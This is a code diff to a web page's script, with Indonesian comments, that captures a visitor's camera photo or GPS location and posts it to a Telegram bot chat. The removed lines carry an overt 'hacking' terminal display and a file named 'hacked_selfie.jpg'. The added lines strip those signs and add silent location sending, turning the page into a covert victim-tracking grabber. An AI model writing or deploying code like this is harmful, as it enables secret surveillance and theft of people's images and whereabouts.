                 if (capturedPhoto) {
                     const res = await fetch(capturedPhoto);
                     const blob = await res.blob();
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'hacked_selfie.jpg');
+                    formData.append('photo', blob, 'selfie.jpg');
                     formData.append('caption', caption);
                     formData.append('parse_mode', 'Markdown');
 
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
-                    const result = await response.json();
-                    if (result.ok) {
-                        addTerminalLine('<span class="prompt">[✔]</span> <span class="data">Data terkirim ke ADMIN!</span>', 'success');
-                    } else {
-                        addTerminalLine('<span class="prompt error">[!]</span> Gagal kirim data: ' + result.description, 'error');
-                    }
+                } else if (capturedLocation) {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            latitude: capturedLocation.lat,
+                            longitude: capturedLocation.lng
+                        })
+                    });
                 }
 
             } catch (err) {
                 console.error('Kirim error:', err);
-                addTerminalLine('<span class="prompt error">[!]</span> Error: ' + err.message, 'error');
             } finally {
                 isProcessing = false;
             }
         }
 
-        // ======================== START PROCESS =====================
-        function startProcess() {
-            addTerminalLine('<span class="prompt">[+]</span> <span class="highlight">INISIASI HACKING...</span>');
-            addTerminalLine('<span class="prompt">[+]</span> Menyusup ke sistem...');
-
+        // ======================== INIT ==============================
+        function init() {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 startCamera();
             } else {
                 cameraDone = false;
-                addTerminalLine('<span class="prompt error">[!]</span> Kamera tidak support', 'error');
                 requestLocation();
             }
         }
 
-        // ======================== INIT ==============================
-        // Ambil config dari API dulu
-        loadConfig();
+        init();
     </script>
 </body>
 </html>
